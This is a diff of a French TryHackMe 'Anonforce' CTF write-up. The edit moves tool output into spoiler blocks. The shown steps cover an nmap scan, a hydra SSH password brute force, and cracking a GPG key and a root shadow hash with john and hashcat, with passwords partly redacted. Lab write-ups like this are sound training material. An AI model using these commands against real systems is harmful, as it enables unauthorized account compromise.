@@ -5,7 +5,7 @@ style: border
 color: thm
 comments: false
 description: Une configuration non sécurisée, et des mots de passe faibles
-modified: 06/09/2024
+modified: 18/03/2025
 ---
 Lien vers l'épreuve : <https://tryhackme.com/room/bsidesgtanonforce>
 
@@ -26,6 +26,9 @@ Lien vers l'épreuve : <https://tryhackme.com/room/bsidesgtanonforce>
 
 ```bash
 nmap -T4 -A 10.10.106.181
+```
+
+{% capture spoil %}
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 15:12 CEST
 Nmap scan report for 10.10.106.181
 Host is up (0.034s latency).
@@ -73,7 +76,8 @@ PORT   STATE SERVICE VERSION
 |   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
 |_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Le scan {% include dictionary.html word="NMAP" %} lancé sur la machine indique la présence d'un serveur {% include dictionary.html word="FTP" %} sur le port 21. Le service n'est pas protégé et n'importe quel utilisateur peut s'y connecter anonymement. Le scan révèle la présence d'une arborescence similaire à une machine Linux
 
@@ -152,6 +156,9 @@ Nous tentons donc de trouver le mot de passe de l'utilisateur "melodias" par la 
 
 ```bash
 hydra -l 'melodias' -P /usr/share/wordlists/rockyou.txt 10.10.106.181 ssh -v
+```
+
+{% capture spoil %}
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 15:33:25
@@ -164,7 +171,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 15:33:
 [ERROR] could not connect to target port 22: Socket error: Connection reset by peer
 [ERROR] ssh protocol error
 [...Expurgé pour brièveté...]
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ### 3.3 Contenu chiffré
 
@@ -219,6 +227,9 @@ Pour cela nous aurons besoin de l'outil *<abbr title="Logiciel de craquage de mo
 gpg2john private.asc > key_hash.txt
 
 john --format=gpg key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+{% capture spoil %}
 Using default input encoding: UTF-8
 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
 Cost 1 (s2k-count) is 65536 for all loaded hashes
@@ -230,7 +241,8 @@ x[...expurgé...]0          (anonforce)
 1g 0:00:00:00 DONE (2024-08-31 18:08) 14.28g/s 13314p/s 13314c/s 13314C/s xbox360..madalina
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous pouvons ajouter la clé privée à notre trousseau avec le mot de passe que nous venons de craquer, et déchiffrer le contenu de l'archive chiffrée `backup.pgp`. Le contenu s'avère être un fichier texte renfermant entre autres les hashes de mot de passe des comptes root et melodias (une copie du fichier shadow que nous espérions récupérer depuis le serveur {% include dictionary.html word="FTP" %} plus tôt)
 
@@ -249,8 +261,9 @@ En lançant {% include dictionary.html word="Hashcat" %} sur les 2 hashes en par
 
 ```bash
 hashcat -m 1800 '$6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0' /usr/share/wordlists/rockyou.txt
-[...expurgé pour brièveté...]
+```
 
+{% capture spoil %}
 $6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0:h[...expurgé...]i
 
 Session..........: hashcat
@@ -273,7 +286,8 @@ Candidates.#1....: 111111111111111 -> droopy
 
 Started: Sat Aug 31 18:30:22 2024
 Stopped: Sat Aug 31 18:31:11 2024
-```
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## 4. Connexion à la machine
 
